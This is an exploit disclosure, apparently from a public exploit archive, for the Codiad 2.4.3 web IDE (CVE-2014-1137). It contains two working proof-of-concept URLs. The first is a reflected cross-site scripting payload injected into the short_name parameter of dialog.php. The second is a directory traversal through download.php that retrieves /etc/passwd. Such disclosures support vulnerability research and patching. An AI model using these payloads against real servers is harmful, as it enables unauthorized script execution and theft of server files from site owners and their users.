@@ -1,0 +1,48 @@
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+                 INDEPENDENT SECURITY RESEARCHER 
+                   PENETRATION TESTING SECURITY
+               -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+ 
+
+# Exploit Title: Codiad 2.4.3 - Cross Site Scripting - Local File Inclusion Vulnerability's 
+# Date: 19/12/2014
+# Url Vendor: http://codiad.com/
+# Vendor Name: Codiad
+# Version: 2.4.3
+# CVE:  CVE-2014-1137
+# Author: TaurusOmar	
+# Tiwtter: @TaurusOmar_
+# Email:  taurusomar13@gmail.com
+# Home:  overhat.blogspot.com
+# Tested On: Bugtraq Optimus
+# Risk: High
+
+Description
+Codiad is a web-based IDE framework with a small footprint and minimal requirements.
+Codiad was built with simplicity in mind, allowing for fast, interactive development without the massive overhead of some of the larger desktop editors. That being said even users of IDE's such as Eclipse, NetBeans and Aptana are finding Codiad's simplicity to be a huge benefit. While simplicity was key, we didn't skimp on features and have a team of dedicated developer actively adding more.
+
+
+------------------------
++ CROSS SITE SCRIPTING + 
+------------------------
+#Exploiting Description - Get into code xss in next path
+
+/components/filemanager/dialog.php?action=rename&path=3&short_name=
+
+#P0c
+http://site.com/components/filemanager/dialog.php?action=rename&path=3&short_name='"><img src=x onerror=prompt(1);>
+
+#Proof Concept
+http://i.imgur.com/rr9b42K.jpg
+
+
+------------------------
++  Local File Incluson +
+------------------------
+# Exploiting Description - Get into path in ur' browser and download private file server /etc/passwd 
+
+#P0c
+http://site.com/components/filemanager/download.php?path=../../../../../../../../../../../etc/passwd&type=undefined
+
+#Proof Concept
+http://i.imgur.com/LSm360S.jpg
